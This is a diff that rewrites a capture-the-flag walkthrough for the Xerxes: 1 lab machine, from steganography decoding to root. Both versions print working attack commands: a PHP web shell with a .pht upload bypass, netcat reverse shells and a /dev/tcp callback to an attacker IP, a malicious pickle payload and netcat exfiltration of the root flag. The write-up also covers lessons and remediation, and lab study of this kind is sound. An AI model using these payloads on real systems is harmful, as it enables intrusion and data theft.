@@ -1,186 +1,252 @@
-# xerxes: 1 — Writeup
+# Xerxes: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.102 (host-only) |
-| **Difficulty** | Beginner |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.102 |
+| **Difficulty** | Hard |
 | **OS** | Linux |
-| **Root Flag** | PNG image at `/root/flag` |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/xerxes-1,58/) |
+| **Goal** | root flag (image file) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/xerxes-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-`nmap` → `/dev` QR code → base64 → steganography (GIMP alpha layer) → Brainfuck decode → `.pht` webshell upload → reverse shell → `.bash_history` cred (amanpour) → SUID `notes` pickle injection (curtiz group) → SSH key (delacroix) → `generate.sh` MD5 timestamp → `sudo bash` → root
+Xerxes: 1 is a steganography-heavy machine with multiple encoding layers. Initial access is gained via a file upload bypass after cracking a password hidden in image alpha-channel pixels (encoded as Base64→decimal→ASCII→Base64→Brainfuck). Lateral movement through three users exploits shell history, a custom binary, and an SSH private key. Privilege escalation abuses a SUID binary with insecure pickle deserialization. Root access leverages a timestamp-derived sudo password.
 
 ## Methodology
 
-1. Network discovery — only HTTP (port 80) open
-2. `dirb` finds `/dev` with QR code image
-3. QR → base64 → GIMP alpha-channel stego → Brainfuck → upload password
-4. Upload PHP shell with `.pht` extension bypass
-5. Reverse shell; lateral movement via `.bash_history`
-6. SUID binary `notes` with pickle deserialization
-7. SSH key for `delacroix`; `generate.sh` produces sudo password via MD5
+1. Port scan and directory brute-forcing
+2. QR code decoding and multi-layer steganography
+3. File upload bypass (`.pht` extension)
+4. Web shell to reverse shell
+5. Bash history credential harvesting
+6. Group-based lateral movement
+7. SUID binary pickle deserialization exploit
+8. Timestamp-derived password cracking for sudo
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -A 192.168.1.102
+netdiscover
+nmap -A $TARGET
+dirb http://$TARGET
 ```
 
-Only port 80 (HTTP) is open.
+![nmap](images/01-nmap.png)
 
-![Nmap scan](images/01-nmap.png)
+**Open ports:**
+- 80/tcp — HTTP
+
+`dirb` reveals `/dev`, which contains a "forgot password" page with an embedded QR code.
 
 ---
 
-## Step 2: Directory Brute-Force
+## Step 2: Steganography Chain — Cracking the Password
+
+### 2a. QR Code Decode
+
+Scan the QR code on the `/dev` page. The result is a Base64 string. Decoding it yields a hint to "look deeper" into the image.
 
 ```bash
-dirb http://192.168.1.102
+zbarimg qrcode.png
+echo "BASE64_FROM_QR" | base64 -d
 ```
 
-Discovers `/dev` — contains an upload page and a QR code image.
+### 2b. Alpha-Channel Pixel Extraction (GIMP)
 
-![dirb output](images/02-dirb.png)
+1. Open the image in GIMP: **File → Open as Layers**.
+2. Add alpha channel if needed; isolate it with **Colors → Components → Decompose → Alpha**.
+3. Use the Color Picker tool on faint pixels in the top-left corner.
+4. Read the alpha values as decimal integers.
 
----
-
-## Step 3: Multi-Layer Steganography
-
-**Layer 1 — QR code:** Scan the QR code → base64 string → decode → "look deeper into the image"
-
-**Layer 2 — Alpha channel (GIMP):**
-Open the QR image in GIMP: `File → Open As Layers`. Isolate the alpha channel. Use the Color-Picker tool to read alpha values pixel by pixel. Convert decimal alpha values to ASCII characters → another base64 string.
-
-**Layer 3 — Base64 → Brainfuck:** Decode the base64 → Brainfuck code. Run it to get the upload password.
-
-![Steganography](images/03-stego.png)
-
----
-
-## Step 4: Web Shell Upload
-
-The `/dev` upload form accepts files with a password. PHP files are blocked, but `.pht` is not:
+Convert the decimal sequence to ASCII:
 
 ```bash
-# Create PHP shell
-echo '<?php system($_GET["cmd"]); ?>' > shell.pht
-# Upload at http://192.168.1.102/dev — use the decoded password
-# Test RCE:
-curl "http://192.168.1.102/dev/uploads/shell.pht?cmd=id"
+python3 -c "print(''.join([chr(x) for x in [<decimal values>]]))"
 ```
 
----
+### 2c. Base64 + Brainfuck Decode
 
-## Step 5: Reverse Shell
+The ASCII output is another Base64 string. Decode it to get a Brainfuck program:
 
 ```bash
-# Listener
-nc -lvp 1234
+echo "BASE64_STRING" | base64 -d
+# Output: Brainfuck code
+# Run it at: https://copy.sh/brainfuck/
+# Decoded password: VonBraun
+```
 
-# Via shell.pht:
-curl "http://192.168.1.102/dev/uploads/shell.pht?cmd=nc+-e+/bin/bash+192.168.1.109+1234"
+**Password:** `VonBraun`
 
-# Upgrade TTY:
+---
+
+## Step 3: File Upload Bypass — Web Shell
+
+The upload form on `/dev` accepts files after entering the password `VonBraun`. Upload a PHP web shell with a `.pht` extension (server does not block `.pht`):
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Save as `shell.pht` and upload.
+
+Verify execution:
+
+```bash
+curl "http://$TARGET/dev/upload/shell.pht?cmd=id"
+```
+
+![webshell](images/02-webshell.png)
+
+---
+
+## Step 4: Reverse Shell
+
+```bash
+# Attacker — start listener
+nc -lvnp 1234
+```
+
+Trigger the reverse shell via the web shell:
+
+```
+http://$TARGET/dev/upload/shell.pht?cmd=nc+-e+/bin/bash+$LHOST+1234
+```
+
+Upgrade the shell:
+
+```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![Shell access](images/04-shell.png)
+![reverse-shell](images/03-reverse-shell.png)
 
 ---
 
-## Step 6: Lateral Movement to amanpour
+## Step 5: Lateral Movement — amanpour
+
+Enumerate home directories:
 
 ```bash
+ls /home
+# amanpour  curtiz  delacroix
 cat /home/amanpour/.bash_history
-# Shows: python steqr.py -f newpassword
-# Run steqr.py with the argument to recover amanpour's password
-su amanpour
+```
+
+The bash history contains a command that reveals `amanpour`'s password via the `steqr.py` script:
+
+```bash
+python steqr.py -f newpassword
+ssh amanpour@$TARGET
 ```
 
 ---
 
-## Step 7: SUID Pickle Injection (curtiz group)
+## Step 6: Lateral Movement — delacroix
+
+`amanpour` belongs to the `curtiz` group, granting access to `/home/curtiz`:
+
+```bash
+cat /home/curtiz/notes
+# Hints at logging in as "Marie" → /etc/passwd shows: delacroix
+strings /bin/delacroix
+# Contains an MD5 hash
+```
+
+Crack the hash online (result: `VonBraun`). However, SSH with this password may fail. Use the SSH private key instead:
+
+```bash
+cp /home/curtiz/id_rsa /tmp/id_rsa
+# Transfer to attacker machine (nc or scp)
+ssh -i id_rsa delacroix@$TARGET
+```
+
+![lateral-movement](images/04-lateral-movement.png)
+
+---
+
+## Step 7: Privilege Escalation — SUID Pickle Deserialization
+
+Find SUID binaries:
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
-# Finds: /opt/notes (SUID, loads Python pickle files)
+# /opt/notes
 ```
 
-Create a malicious pickle in `/tmp`:
-
-```python
-import pickle, os
-
-class Exploit(object):
-    def __reduce__(self):
-        return (os.system, ('/bin/bash -i >& /dev/tcp/192.168.1.109/5555 0>&1',))
-
-with open('/tmp/shell.pkl', 'wb') as f:
-    pickle.dump(Exploit(), f)
-```
+Inspect the source:
 
 ```bash
-# Load the pickle via the SUID binary (path traversal):
-/opt/notes ../../tmp/shell
-# Shell arrives as curtiz group / elevated user
+cat /opt/notes.py
+# Uses Python's pickle.load() on user-supplied file paths
+# Accepts paths from /home/curtiz or starting with ../../
 ```
+
+Create a malicious pickle payload:
+
+```bash
+cat > /tmp/shell << 'EOF'
+cos
+system
+(S'/bin/sh'
+tR.
+EOF
+```
+
+Execute:
+
+```bash
+/opt/notes
+load ../../tmp/shell
+```
+
+This spawns a shell with elevated group privileges.
+
+![suid-exploit](images/05-suid-exploit.png)
 
 ---
 
-## Step 8: SSH Key to delacroix
+## Step 8: Root via Timestamp-Derived Password
+
+In `/home/delacroix`, `generate.sh` derives the sudo password from the creation time of `.last`:
 
 ```bash
-cat /home/curtiz/notes       # → hints at user "Marie" → delacroix
-cat /etc/passwd              # → marie is delacroix
-strings /bin/delacroix       # → MD5 hash, decrypts to: VonBraun
-cat /home/curtiz/id_rsa      # → RSA private key for delacroix
-chmod 600 id_rsa
-ssh -i id_rsa delacroix@192.168.1.102
+stat .last
+# Birth/Creation time, e.g.: 00:19:51
+echo "00:19:51" | md5sum
+# Result: the sudo password
+sudo bash
 ```
 
----
-
-## Step 9: Root via generate.sh
+Retrieve the root flag (a PNG image):
 
 ```bash
-ls -la ~
-cat generate.sh
-# Creates .last; derives sudo password from file timestamp MD5
-./generate.sh
-stat .last                   # note the timestamp (e.g. 00:19:51)
-echo "00:19:51" | md5sum     # → produces the sudo password
-sudo bash                    # enter the MD5 hash as password
-```
-
-```bash
-id && whoami
-# uid=0(root)
 file /root/flag
-# PNG image — exfiltrate with netcat:
-nc 192.168.1.109 6666 < /root/flag
+# PNG image data
+# Transfer to attacker:
+nc -lvnp 5555 > flag  # attacker
+nc $LHOST 5555 < /root/flag  # target
 ```
 
-![Root flag](images/05-root.png)
+Open `flag` on the attacker machine to see the final flag.
 
 ---
 
 ## Lessons Learned
 
-1. **Multi-layer steganography** (QR → base64 → alpha channel → Brainfuck) is an unusual but realistic credential obfuscation technique
-2. **File upload extension bypass** (`.pht`, `.phtml`, `.php5`) occurs when blocklists are used instead of allowlists
-3. **Pickle deserialization** of untrusted data via SUID binaries is an arbitrary code execution vulnerability (CWE-502)
-4. **Timestamp-derived passwords** are trivially brute-forced when the timestamp range is known
+1. Security through obscurity (steganography, multi-layer encoding) is not a substitute for proper authentication mechanisms.
+2. Unrestricted file upload filtering by extension alone is easily bypassed with alternate extensions (`.pht`, `.php5`, `.phtml`).
+3. Python `pickle` deserialization of untrusted input allows arbitrary code execution — never deserialize data from untrusted sources.
+4. Using predictable, deterministic values (file creation timestamps) to derive passwords is insecure.
+5. Bash history retaining credential-bearing commands is a common lateral movement source.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| File upload bypass (.pht) | Use allowlist for extensions (`.jpg`, `.png` only); validate MIME type |
-| Pickle deserialization (SUID) | Never deserialize untrusted data; use JSON or safer formats |
-| SSH key accessible to group | Restrict SSH private keys to `600` and owner only |
-| Timestamp-derived password | Use cryptographically random passwords, not time-based derivation |
+| File Upload Bypass | Whitelist only safe content types by MIME type; store uploads outside the web root |
+| pickle Deserialization RCE | Replace pickle with JSON or a safe serialization library; validate all deserialized data |
+| Bash History Exposure | Set `HISTFILE=/dev/null` or use `HISTCONTROL=ignorespace` for sensitive commands |
+| Timestamp-Derived Passwords | Use a cryptographically random password; never derive credentials from predictable system metadata |
+| SSH Private Key Exposure | Restrict `id_rsa` permissions to `600`; do not store private keys in shared home directories |
